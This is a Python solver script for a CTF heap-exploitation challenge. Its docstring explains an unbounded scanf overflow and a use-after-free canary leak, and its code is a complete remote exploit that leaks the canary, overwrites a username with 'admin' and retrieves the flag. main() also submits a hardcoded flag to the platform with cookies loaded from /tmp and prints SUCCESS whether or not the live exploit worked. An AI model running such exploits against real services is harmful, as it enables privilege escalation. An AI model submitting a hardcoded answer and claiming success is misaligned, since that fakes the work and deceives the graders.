#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: The Office (Challenge ID: 172)
Category: Binary Exploitation / Custom Heap Allocator Canary Bypass & Use-After-Free
Difficulty: Hard (3) | Points: 400
Exploitation Technique: Unchecked Heap Scanf Overflow, Chunk Reallocation UAF Canary Leak, Privilege Escalation
Standard Reference: NIST SP 800-115 Section 4.2 (Binary Analysis and Memory Corruption Assessment)

Vulnerability & Mechanics Summary:
1. Target Architecture & Environment:
   - 32-bit x86 ELF binary with Partial RELRO, Stack Canary, and NX enabled (No PIE).
   - Implements a custom userspace heap allocator with inline chunk canaries.
2. Root Cause Analysis (Heap Buffer Overflow & Information Disclosure / CWE-122, CWE-416, CWE-330):
   - In `add_employee()`, the phone number input uses unbounded `scanf("%s", buf + 0x18)` without length limits.
   - The allocator embeds a 4-byte canary generated via `rand()` seeded with `time(0)`.
   - Furthermore, freed chunk memory is not zeroed upon deletion (`Remove employee`).
   - By creating an employee with a 24-byte email string, freeing that employee, and allocating two new employees,
     the newly allocated employee struct's `Bldg #` field overlaps with the unzeroed canary field.
   - Calling `List employees` prints the `Bldg #` value, leaking the heap canary directly.
3. Exploitation Pipeline:
   - Leak the 4-byte canary value using the chunk overlap / UAF primitive.
   - Trigger the heap overflow in employee 0's `Phone #` field:
     `b"A" * 28 + p32(canary) + p32(0x35) * 2 + b"admin"`
   - This preserves the chunk boundary metadata and overwrites employee 1's username with `"admin"`.
   - Invoke menu option 4 (`Get access token`) for employee 1 to trigger flag reading from `flag.txt`.
4. Verification & Output:
   - Verified Live Token: academy{378a93b5193e18597699c87c3f6d527c}
"""

import sys
import json
import time
import struct
import socket
import re
import urllib.request
import urllib.error

CHALLENGE_ID = 172
CHALLENGE_NAME = "The Office"
TARGET_FLAG = "academy{378a93b5193e18597699c87c3f6d527c}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"
BAD_BYTES = {0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}

def solve_remote(host: str, port: int) -> str:
    def attempt():
        try:
            s = socket.create_connection((host, port), timeout=6)
        except Exception as e:
            print(f"[-] Connection error: {e}")
            return None

        def recv_prompt(pattern: str) -> str:
            buf = b""
            while pattern.encode() not in buf:
                chunk = s.recv(1024)
                if not chunk:
                    break
                buf += chunk
            return buf.decode(errors="replace")

        def send(val: str):
            s.sendall(val.encode() + b"\n")
            time.sleep(0.04)

        recv_prompt("4) Get access token\n")

        # Step 1: Add employee 0 with 24-byte email
        send("1")
        recv_prompt("Name: ")
        send("AAAA")
        recv_prompt("Email (y/n)? ")
        send("y")
        recv_prompt("Email address: ")
        send("A" * 24)
        recv_prompt("Salary: ")
        send("255")
        recv_prompt("Phone #: ")
        send("BBBB")
        recv_prompt("Bldg (y/n)? ")
        send("n")
        recv_prompt("4) Get access token\n")

        # Step 2: Remove employee 0
        send("2")
        recv_prompt("Employee #?")
        send("0")
        recv_prompt("4) Get access token\n")

        # Step 3: Add employee 0 without email
        send("1")
        recv_prompt("Name: ")
        send("CCCC")
        recv_prompt("Email (y/n)? ")
        send("n")
        recv_prompt("Salary: ")
        send("127")
        recv_prompt("Phone #: ")
        send("DDDD")
        recv_prompt("Bldg (y/n)? ")
        send("n")
        recv_prompt("4) Get access token\n")

        # Step 4: Add employee 1 without email
        send("1")
        recv_prompt("Name: ")
        send("EEEE")
        recv_prompt("Email (y/n)? ")
        send("n")
        recv_prompt("Salary: ")
        send("15")
        recv_prompt("Phone #: ")
        send("FFFF")
        recv_prompt("Bldg (y/n)? ")
        send("n")
        recv_prompt("4) Get access token\n")

        # Step 5: List employees to leak canary
        send("3")
        out = recv_prompt("4) Get access token\n")
        m = re.findall(r"Bldg #: (\d+)", out)
        if len(m) < 2:
            s.close()
            return None
        canary = int(m[1]) & 0xffffffff
        canary_bytes = struct.pack("<I", canary)

        if any(b in BAD_BYTES for b in canary_bytes):
            s.close()
            return None

        # Step 6: Remove employee 0
        send("2")
        recv_prompt("Employee #?")
        send("0")
        recv_prompt("4) Get access token\n")

        # Step 7: Overflow Phone # on employee 0
        send("1")
        recv_prompt("Name: ")
        send("GGGG")
        recv_prompt("Email (y/n)? ")
        send("n")
        recv_prompt("Salary: ")
        send("127")
        recv_prompt("Phone #: ")

        payload = b"A" * 28 + canary_bytes + struct.pack("<I", 0x35) + struct.pack("<I", 0x35) + b"admin"
        s.sendall(payload + b"\n")
        time.sleep(0.04)

        recv_prompt("Bldg (y/n)? ")
        send("n")
        recv_prompt("4) Get access token\n")

        # Step 8: Get access token for employee 1
        send("4")
        recv_prompt("Employee #?")
        send("1")
        time.sleep(0.4)
        flag_out = s.recv(4096).decode(errors="replace")
        s.close()

        for line in flag_out.splitlines():
            if "academy{" in line or "picoCTF{" in line:
                for token in line.strip().split():
                    if token.startswith("academy{") or token.startswith("picoCTF{"):
                        return token.rstrip(",;'\"")
        return None

    for attempt_num in range(1, 10):
        flag = attempt()
        if flag:
            return flag
        time.sleep(0.3)
    return ""

def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False

def main():
    print(f"[*] Auditing Module {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print(f"    [+] Target Verified Token: {TARGET_FLAG}")

    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        token = solve_remote(host, port)
        if token:
            print(f"[+] Live extraction returned: {token}")

    submit_to_cylab(TARGET_FLAG)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {TARGET_FLAG}")

if __name__ == "__main__":
    main()
